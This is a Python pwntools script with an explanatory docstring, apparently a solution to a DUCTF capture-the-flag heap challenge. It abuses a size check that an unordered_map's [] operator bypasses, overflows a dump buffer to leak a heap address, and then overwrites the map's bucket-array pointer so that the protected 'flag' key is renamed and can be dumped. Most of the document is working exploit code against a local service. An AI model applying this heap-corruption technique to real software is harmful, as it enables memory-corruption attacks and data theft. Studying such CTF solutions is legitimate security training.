import re
from pwn import *


"""
The flag is stored in the kv unordered_map with the key "flag".
We are able to get and set values in the map as well as dump all
of the items. Of course, we cannot get or dump the flag entry.

There is a blatant bug which is that the dump char array is fixed
size, but the map can grow without bounds; there is a check for
the max size in the set function, but the [] operator actually
adds an element to the map and increases its size, so this check
can be bypassed by getting an element when the map is "max" size.

This gives us an overflow in the dump buffer, which is followed
by the kv_db map itself. The way an unordered_map is implemented
is as an array of linked lists each of which correspond to a
bucket that a key can hash to.

The general idea for the exploit is to first use the dump overflow
to leak a heap address (specifically, we leak the array of linked
lists pointer for the unordered map). Once we have this leak, we
can calculate the location of the "flag" key string in the heap.
Using the overflow, we can overwrite the array of linked lists
pointer to point somewhere near this key string. Then, by setting
an element such that the bucket index corresponds to the offset
of the key string value relative to our overwritten array of
linked lists pointer, we can change the key value corresponding to
the flag. Once the key value is no longer "flag", we can simply
dump the db to read the flag.
"""


def get(key):
    conn.sendlineafter(b'> ', b'1')
    conn.sendlineafter(b'key: ', key)
    return conn.recvline()

def set(key, val):
    conn.sendlineafter(b'> ', b'2')
    conn.sendlineafter(b'key: ', key)
    conn.sendlineafter(b'val: ', val)

def dump():
    conn.sendlineafter(b'> ', b'3')
    return conn.recvuntil(b'1. Get', drop=True)


conn = remote('0.0.0.0', 1337)

for i in range(4):
    set((str(i) * 8).encode(), b'x' * 32)
get(b'4' * 8)
set(b'5' * 8, b'x' * 32)
set(b'6' * 1, b'x' * 1)

d = dump()
heap_leak = u64(d.strip()[-6:].ljust(8, b'\x00'))
log.success(f'heap_leak = {hex(heap_leak)}')

get(b'7' * 7)
set(b'8' * 4, b'x' * 18)
set(b'0' * 8, p64(heap_leak - 0x58) + p64(0xd) + p64(heap_leak - 0x58 - 0x8))
dump()

set(b'DUCTF', b'gg')

d = dump()
f = re.findall(rb'DUCTF{.*}', d)
if f:
    log.success(f'flag: {f[0].decode()}')

conn.close()
